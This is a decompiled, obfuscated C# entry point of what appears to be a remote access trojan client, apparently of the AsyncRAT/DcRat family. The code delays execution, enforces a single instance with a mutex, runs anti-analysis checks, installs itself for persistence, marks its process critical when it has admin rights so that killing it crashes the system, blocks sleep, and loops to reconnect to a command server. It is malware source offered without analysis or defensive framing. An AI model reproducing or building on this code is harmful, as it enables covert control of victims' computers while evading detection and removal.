using System;
using System.Threading;
using Client.Connection;
using Client.Helper;
using Client.Install;
using dg3ypDAonQcOidMs0w;
using fQosxZ2k0KXs2yyDcFA;

namespace Client;

public class Program
{
	private static Program bqeZsIAYoKIFw0qpHX;

	public static void Main()
	{
		XliSbN2oAPxhVpUoRhK.OFt1Wd3l3P08E();
		for (int i = 0; i < Convert.ToInt32(Settings.Delay); i++)
		{
			Thread.Sleep(1000);
		}
		if (!Settings.InitializeSettings())
		{
			Environment.Exit(0);
		}
		try
		{
			if (!MutexControl.CreateMutex())
			{
				Environment.Exit(0);
			}
			if (Convert.ToBoolean(Settings.Anti))
			{
				Anti_Analysis.RunAntiAnalysis();
			}
			if (Convert.ToBoolean(Settings.Install))
			{
				NormalStartup.Install();
			}
			if (Convert.ToBoolean(Settings.BDOS) && Methods.IsAdmin())
			{
				ProcessCritical.Set();
			}
			Methods.PreventSleep();
		}
		catch
		{
		}
		while (true)
		{
			try
			{
				if (!ClientSocket.IsConnected)
				{
					ClientSocket.Reconnect();
					ClientSocket.InitializeClient();
				}
			}
			catch
			{
			}
			Thread.Sleep(5000);
		}
	}

	static Program()
	{
		XliSbN2oAPxhVpUoRhK.OFt1Wd3l3P08E();
		WP6RZJql8gZrNhVA9v.prXoP4RuYp();
		zihaUZfOUr0MZbCinb();
		zihaUZfOUr0MZbCinb();
	}

	internal static bool kERG35S5xub2rn1l3G()
	{
		return true;
	}

	internal static Program vsPaovbybN0DKrtmEI()
	{
		return null;
	}

	internal static void Yx70NoVhy3g23fUx3w()
	{
	}

	internal static void zihaUZfOUr0MZbCinb()
	{
	}
}
